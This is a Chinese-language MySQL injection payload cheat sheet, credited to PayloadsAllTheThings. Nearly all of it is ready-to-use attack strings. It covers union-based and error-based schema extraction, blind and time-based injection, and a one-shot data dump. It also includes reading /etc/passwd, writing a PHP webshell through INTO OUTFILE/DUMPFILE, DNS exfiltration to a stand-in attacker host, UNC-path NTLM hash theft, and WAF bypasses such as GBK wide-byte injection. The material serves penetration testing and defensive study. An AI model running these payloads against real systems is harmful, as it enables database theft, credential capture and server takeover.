# MySQL Injection - MySQL注入

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection SQL注入 MySQL注入
数据库: MySQL MariaDB
版本: MySQL 4 MySQL 5 MySQL 8
关键词: information_schema union select sleep benchmark extractvalue updatexml load_file outfile dumpfile
攻击技术: Union Based Error Based Blind Time Based DIOS Out-of-Band
特殊技术: Wide Byte Injection GBK UDF Webshell

[CONTENT]

## MySQL 注入专用技术

### 默认数据库
- `mysql` - 需要root权限
- `information_schema` - MySQL 5及以上版本可用

### MySQL 注释

| 类型 | 描述 |
|------|------|
| `#` | Hash注释 |
| `/* */` | C风格注释 |
| `/*! */` | MySQL特殊SQL |
| `/*!32302 10*/` | MySQL版本注释 |
| `--` | SQL注释 |
| `;%00` | 空字节 |

## Union Based 注入

### 列数检测

```sql
# NULL迭代法
UNION SELECT NULL;--
UNION SELECT NULL, NULL;--
UNION SELECT NULL, NULL, NULL;--

# ORDER BY法
ORDER BY 1--+  -- True
ORDER BY 2--+  -- True
ORDER BY 3--+  -- False = 3列
```

### 数据提取

```sql
# 数据库
UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata

# 表名
UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()

# 列名
UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'
```

## Error Based 注入

### UpdateXML函数
```sql
AND UPDATEXML(rand(),CONCAT(0x0a,version()),null)-- -
AND UPDATEXML(rand(),CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### ExtractValue函数 (MySQL >= 5.1)
```sql
AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT version())))--
```

## Blind 注入

### 布尔盲注
```sql
AND SUBSTRING(version(),1,1)=5
AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### 时间盲注
```sql
# SLEEP函数
AND SLEEP(5)=0
AND IF(MID(@@version,1,1)='5',sleep(1),1)='2

# BENCHMARK函数
AND BENCHMARK(2000000,MD5(NOW()))
```

## DIOS (Dump In One Shot)

单次查询提取全部数据：

```sql
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
```

## 文件操作

### 读取文件
```sql
UNION SELECT LOAD_FILE('/etc/passwd') --
UNION SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'))
```

### 写入Webshell
```sql
# OUTFILE方法
UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"

# DUMPFILE方法
UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/shell.php'
```

## Out-of-Band 外带数据

### DNS外带
```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.site\\a.txt'))
```

### UNC路径 - NTLM Hash窃取
```sql
SELECT LOAD_FILE('\\\\error\\abc')
SELECT '' INTO DUMPFILE '\\\\error\\abc'
```

## WAF 绕过

### 科学计数法
```sql
SELECT table_name FROM information_schema 1.e.tables
' or 1.e('')='
```

### 条件注释
```sql
/*!12345UNION*/
/*!31337SELECT*/
```

### 宽字节注入 (GBK)
```sql
%bf' OR 1=1 -- --
%df' AND 1=1 -- +
%A8%27 OR 1=1-- -
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/MySQL Injection.md